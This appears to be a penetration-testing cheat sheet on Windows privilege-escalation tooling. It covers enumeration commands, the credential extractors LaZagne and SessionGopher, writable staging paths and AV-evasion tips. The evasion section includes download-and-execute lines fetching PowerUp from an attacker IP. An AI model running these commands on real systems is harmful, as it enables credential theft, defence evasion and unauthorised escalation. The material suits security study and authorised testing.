## Windows Privilege Escalation Tools

The toolset for Windows privilege escalation splits into two categories: broad enumeration tools that surface everything at once, and targeted tools that focus on specific vulnerability classes. Knowing which to use and when prevents information overload while maximising coverage. 

***

## Tool Reference

| Tool | Type | Primary Use | AV Detection |
|---|---|---|---|
| WinPEAS | Executable / script | Broad automated enumeration of all common vectors | Very high  |
| Seatbelt | C# (.NET) | Situational awareness, token data, credential files | Moderate |
| PowerUp | PowerShell | Targeted service and registry misconfiguration checks | Moderate |
| SharpUp | C# (.NET) | C# port of PowerUp, same checks, binary format | Moderate |
| JAWS | PowerShell 2.0 | Enumeration for legacy hosts (PS2 compatible) | Low |
| Watson | .NET | Missing KB patches and suggested kernel exploits | Low |
| WES-NG | Python (offline) | Maps `systeminfo` output to known CVEs | None (runs on attacker box) |
| SessionGopher | PowerShell | Extracts saved PuTTY, WinSCP, RDP, FileZilla sessions | Moderate |
| LaZagne | Executable | Credential extraction from browsers, databases, apps | Very high (47/70 on VT) |
| AccessChk | Sysinternals binary | Granular ACL checking on services, files, registry | None (signed by Microsoft) |
| PipeList | Sysinternals binary | Lists named pipes (useful for impersonation research) | None |
| PsService | Sysinternals binary | Service enumeration and control | None |

***

## Tool Usage Reference

### WinPEAS

```powershell
# Full scan
.\winPEASx64.exe

# Quiet mode, suppress colour codes (cleaner for logging)
.\winPEASx64.exe quiet

# Run specific check categories only
.\winPEASx64.exe systeminfo
.\winPEASx64.exe servicesinfo
.\winPEASx64.exe userinfo

# 32-bit version for x86 targets
.\winPEASx86.exe
```

### Seatbelt

```powershell
# Run all checks
.\Seatbelt.exe -group=all

# Targeted checks (reduces noise and EDR footprint)
.\Seatbelt.exe TokenPrivileges
.\Seatbelt.exe CredEnum
.\Seatbelt.exe AutoRuns
.\Seatbelt.exe Services
.\Seatbelt.exe ProcessCreationEvents
.\Seatbelt.exe WindowsCredentialFiles

# Useful groups
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=misc
```

### PowerUp / SharpUp

```powershell
# PowerUp - run all checks
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# PowerUp - individual targeted checks
powershell -ep bypass -c ". .\PowerUp.ps1; Get-UnquotedService"
powershell -ep bypass -c ". .\PowerUp.ps1; Get-ModifiableServiceFile"
powershell -ep bypass -c ". .\PowerUp.ps1; Get-ModifiableService"
powershell -ep bypass -c ". .\PowerUp.ps1; Get-RegistryAlwaysInstallElevated"
powershell -ep bypass -c ". .\PowerUp.ps1; Get-RegistryAutoLogon"

# SharpUp (binary equivalent)
.\SharpUp.exe audit
.\SharpUp.exe audit UnquotedServicePath
.\SharpUp.exe audit ModifiableServiceBinaries
```

### WES-NG (Windows Exploit Suggester Next Gen)

```bash
# Run on attacker machine - needs systeminfo output from target

# On target, capture systeminfo
systeminfo > C:\Windows\Temp\sysinfo.txt

# Transfer file to attack machine, then run:
python3 wes.py sysinfo.txt

# Update the vulnerability database first
python3 wes.py --update

# Filter output
python3 wes.py sysinfo.txt --impact "Elevation of Privilege"
python3 wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only
```

### Watson

```powershell
# Run to enumerate missing patches with known exploits
.\Watson.exe
```

### SessionGopher

```powershell
# Local user saved sessions
powershell -ep bypass -c ". .\SessionGopher.ps1; Invoke-SessionGopher -Thorough"

# All users on local machine (requires admin)
powershell -ep bypass -c ". .\SessionGopher.ps1; Invoke-SessionGopher -AllDomain"
```

### LaZagne

```cmd
:: Extract all credentials (browsers, databases, WiFi, Windows vaults)
lazagne.exe all

:: Specific categories
lazagne.exe browsers
lazagne.exe windows
lazagne.exe sysadmin
lazagne.exe databases
```

### Sysinternals AccessChk

```cmd
:: Accept EULA silently (critical on first run to avoid popup blocking execution)
accesschk.exe /accepteula

:: Check service permissions
accesschk.exe /accepteula -ucqv <service_name>
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

:: Check directory permissions
accesschk.exe /accepteula -uwdqs Users C:\
accesschk.exe /accepteula -uwdqs "Everyone" "C:\Program Files"

:: Check registry key permissions
accesschk.exe /accepteula -kv "HKLM\System\CurrentControlSet\Services"
```

***

## Writable Upload Locations

When no obvious writable directory is available, these locations typically allow write access to standard users: 

```
C:\Windows\Temp                          <- BUILTIN\Users has write access
C:\Users\Public
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\Windows\tracing
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
```

`C:\Windows\Temp` is the safest and most reliable. Always clean up tools after use.

***

## AV Evasion Considerations

Almost every tool in this list will be flagged by Windows Defender and commercial EDR products. LaZagne alone is detected by 47 out of 70 engines on VirusTotal.  For engagements where evasion matters: 

- Compile tools from source with modified function names and string constants
- Use Seatbelt with only specific modules instead of `-group=all` to reduce binary footprint
- PowerShell-based tools (PowerUp, JAWS) can be run in memory via `IEX (New-Object Net.WebClient).DownloadString()` to avoid touching disk
- Sysinternals tools (AccessChk, PsService) are Microsoft-signed and generally not flagged

```powershell
# In-memory execution of PowerUp (no file written to disk)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1')
Invoke-AllChecks

# Or from a local web server if the host has no internet
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1'); Invoke-AllChecks"
```

***

## Recommended Workflow

```
1. Upload and run WinPEAS (broad baseline, accept the noise)
2. Run PowerUp/SharpUp (confirm service and registry findings)
3. Run Seatbelt with targeted modules (token privileges, credential files)
4. Run WES-NG offline against captured systeminfo (kernel/patch CVEs)
5. Use AccessChk to manually verify any finding before exploitation
6. Check SessionGopher and LaZagne for saved credentials
7. Manually verify every finding before attempting exploitation
```

The most common mistake is running WinPEAS, seeing hundreds of lines of output, and attempting the first yellow or red finding without validating it manually first. Tools produce false positives, and manual verification with AccessChk or `icacls` before any exploitation attempt saves time and prevents failed exploits. 
